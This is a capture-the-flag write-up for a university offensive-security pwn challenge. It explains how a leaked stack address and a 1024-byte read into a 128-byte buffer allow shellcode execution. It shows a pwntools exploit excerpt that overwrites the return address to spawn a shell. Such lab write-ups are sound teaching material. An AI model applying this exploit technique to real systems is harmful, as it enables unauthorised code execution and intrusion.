# Whispered Secrets

**Category:** pwn / stack buffer overflow + info leak · **Course:** Offensive Security (PoliTo)

## Challenge

The binary prints the stack address of its own input buffer (`printf("secret: %p\n", buf)`) before reading into it — a free infoleak — then reads 1024 bytes into a 128-byte `char buf[128]`.

## Vulnerability

Two issues combine: the address leak defeats ASLR for the stack, and `read(STDIN_FILENO, buf, 1024)` on a 128-byte buffer is a straightforward overflow with no canary in the way. NX is not enforced either (the binary is built with `-z execstack`), so injected shellcode on the stack will actually execute.

## Exploitation

1. Parse the leaked buffer address straight out of the banner.
2. Build an `execve("/bin/sh")` shellcode with pwntools' `shellcraft.sh()`.
3. Lay the shellcode at the start of the payload, pad with filler up to the saved-RIP offset (**136 bytes**), then overwrite the return address with the leaked buffer address — jumping back into our own shellcode.

As in `solve.py`:

```python
offset = 136

p.recvuntil(b"secret: ")
leak = int(p.recvline().strip(), 16)        # leaked buf address

shell = asm(shellcraft.sh())

payload = flat(
    shell,
    b"A" * (offset - len(shell)),
    p64(leak),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fno-stack-protector -z execstack -no-pie -O0 -g`: no canary, executable stack, fixed load address)
- `whispered_secrets` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
